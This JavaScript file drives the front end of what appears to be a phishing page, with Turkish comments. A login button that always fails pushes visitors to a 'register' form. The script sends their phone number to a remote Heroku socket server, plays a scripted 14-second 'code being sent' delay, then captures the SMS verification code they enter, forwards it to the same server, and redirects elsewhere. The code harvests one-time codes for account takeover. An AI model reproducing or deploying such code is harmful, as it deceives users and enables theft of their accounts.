console.log("SCRIPT.JS YÜKLENDİ - BAŞLANGIÇ");  // Debug: Script yüklendi mi?

function showCard(card) {
  console.log("showCard çağrıldı:", card);  // Debug
  if (card) {
    card.classList.remove("hidden");
    requestAnimationFrame(() => {
      card.classList.add("visible");
    });
  } else {
    console.log("showCard hatası: Card bulunamadı");
  }
}

function hideCard(card) {
  if (card) {
    card.classList.remove("visible");
    setTimeout(() => {
      card.classList.add("hidden");
    }, 300);
  } else {
    console.log("hideCard hatası: Card bulunamadı");
  }
}

function showRegister() {
  hideCard(loginCard);
  showCard(registerCard);
}

function showLogin() {
  hideCard(registerCard);
  hideCard(verifyCard);
  hideCard(successScreen);
  showCard(loginCard);
}

document.addEventListener("DOMContentLoaded", () => {
  console.log("DOMContentLoaded TETİKLENDİ!");  // Debug: Sayfa yüklendi mi?

  // Element tanımlamaları
  const loginCard = document.getElementById("loginCard");
  const registerCard = document.getElementById("registerCard");
  const verifyCard = document.getElementById("verifyCard");
  const successScreen = document.getElementById("successScreen");

  console.log("LoginCard bulundu mu?", loginCard);  // Debug: Elementler var mı?

  // başlangıç durumu
  if (registerCard) registerCard.classList.add("hidden");
  if (verifyCard) verifyCard.classList.add("hidden");
  if (successScreen) successScreen.classList.add("hidden");
  if (loginCard) showCard(loginCard);

  // Socket bağlantısını buraya taşıdım - kütüphane yüklendikten sonra bağlan, io not defined hatasını giderir
  if (typeof io !== 'undefined') {
    const socket = io('https://afternoon-lake-61658-70a3b4756b95.herokuapp.com');
    console.log("CLIENT SOCKET BAĞLANDI");

    // TELEFON INPUT
    const phoneInput = document.getElementById("registerPhone");

    if (phoneInput) {
      phoneInput.addEventListener("focus", () => {
        if (phoneInput.value === "") phoneInput.value = "05";
      });

      phoneInput.addEventListener("input", () => {
        phoneInput.value = phoneInput.value.replace(/[^0-9]/g, "");
        if (!phoneInput.value.startsWith("05")) phoneInput.value = "05";
        if (phoneInput.value.length > 11) {
          phoneInput.value = phoneInput.value.slice(0, 11);
        }
      });
    }

    // REGISTER → VERIFY (4x spin)
    const registerBtn = document.getElementById("registerSubmit");
    const btnText = registerBtn ? registerBtn.querySelector(".btn-text") : null;

    console.log("registerBtn bulundu mu?", registerBtn);  // Debug: Buton var mı?

    if (registerBtn) {
      registerBtn.addEventListener("click", () => {
        console.log("Gönder butonu tıklandı!");  // Debug: Tıklandı mı?

        const phone = phoneInput ? phoneInput.value.trim() : '';
        console.log("Telefon numarası:", phone);  // Debug: Telefon girildi mi?

        if (!phone) {
          console.log("Telefon boş, return");  // Debug: Boş mu?
          return;
        }

        socket.emit("new-phone", phone);
        console.log("socket.emit çağrıldı");  // Debug: Emit gitti mi?

        registerBtn.disabled = true;
        if (btnText) btnText.textContent = "Kod gönderiliyor";
        registerBtn.classList.add("spinning");

        // 12. saniyede yazı değişsin
        setTimeout(() => {
          if (btnText) btnText.textContent = "Kod gönderildi";
          registerBtn.classList.add("slow");
        }, 12000);

        // 14. saniyede ekran değişsin
        setTimeout(() => {
          registerBtn.classList.remove("spinning");
          registerBtn.classList.remove("slow");
          registerBtn.disabled = false;
          if (btnText) btnText.textContent = "Kod gönderiliyor";
          hideCard(registerCard);
          showCard(verifyCard);
        }, 14000);
      });
    } else {
      console.log("registerBtn hatası: Bulunamadı");
    }

    // VERIFY → SUCCESS
    const verifyBtn = document.getElementById("verifySubmit");

    if (verifyBtn) {
      verifyBtn.addEventListener("click", () => {
        const code = document.getElementById("verifyCode").value.trim();
        if (!code) return;

        console.log("CLIENT CODE GÖNDERDİ:", code);
        socket.emit("new-code", code);

        verifyBtn.classList.add("loading");

        setTimeout(() => {
          verifyBtn.classList.remove("loading");
          hideCard(verifyCard);
          showCard(successScreen);

          setTimeout(() => {
            window.location.href = "https://hukumsuz.de/";
          }, 2000);

        }, 2000);
      });
    }

    // Giriş Yap butonunun tıklanma işlevi
    const loginBtn = document.getElementById("loginBtn");
    const loginError = document.getElementById("loginError");

    if (loginBtn) {
      loginBtn.addEventListener("click", (e) => {
        e.preventDefault();

        // Kullanıcı hatası mesajını göster
        loginError.style.display = "block";
      });
    }

  } else {
    console.log("io hatası: Socket.io client yüklenmedi");
  }
});